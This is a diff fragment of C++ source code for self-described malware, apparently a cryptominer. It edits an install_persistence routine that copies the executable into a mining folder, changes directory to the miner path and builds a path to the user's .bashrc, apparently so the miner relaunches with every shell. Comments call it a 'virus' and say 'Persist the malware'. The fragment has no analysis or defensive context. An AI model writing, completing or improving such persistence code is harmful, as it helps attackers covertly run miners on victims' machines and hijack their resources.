@@ -171,7 +171,6 @@ void copy_executable_to_folder(){
     // remove old virus file.
     // const char * command = (x = std::string("rm ") += std::string(executable_name)).c_str();
     // system(command);
-    
 }
 
 
@@ -181,16 +180,18 @@ void install_persistence(){
     if(create_cryptomining_folder()){
         copy_executable_to_folder();
     }else{
+        
         FILE *f = fopen(executable_path, "rb");
         if(f == NULL){
             copy_executable_to_folder();
-            fclose(f);
         }
     }
 
+    chdir(miner_path);
+
     /* Persist the malware */
     std::string x;
-    const char * command = (x = std::string("./") += std::string(executable_path)).c_str();
+    const char * command = (x = std::string(".") += std::string(executable_path)).c_str();
     
     std::string caminho;
     const char * bashrc_path = (caminho = std::string(get_home_enviroment()) += std::string(".bashrc")).c_str();
